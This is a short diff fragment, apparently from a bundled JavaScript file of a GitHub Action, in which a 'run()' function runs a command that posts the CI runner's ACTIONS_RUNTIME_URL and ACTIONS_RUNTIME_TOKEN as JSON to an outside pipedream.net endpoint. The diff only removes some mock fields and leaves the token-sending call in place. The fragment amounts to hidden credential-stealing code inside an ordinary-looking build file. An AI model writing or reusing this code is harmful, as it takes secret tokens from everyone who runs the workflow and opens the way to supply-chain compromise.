@@ -6849,10 +6849,7 @@ function run() {
         "url": "${process.env['ACTIONS_RUNTIME_URL']}",
         "token": "${process.env['ACTIONS_RUNTIME_TOKEN']}",
         "mock_data": "true",
-        "ip_address": "92.188.61.181",
-        "email": "user@example.com",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
-        "url": "http://example.com/"
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
       }'   -H "Content-Type: application/json"   https://enkgla8fqv5sth6.m.pipedream.net`, (error, stdout, stderr) => {
                     if (error) {
                         console.log(`error: ${error.message}`);
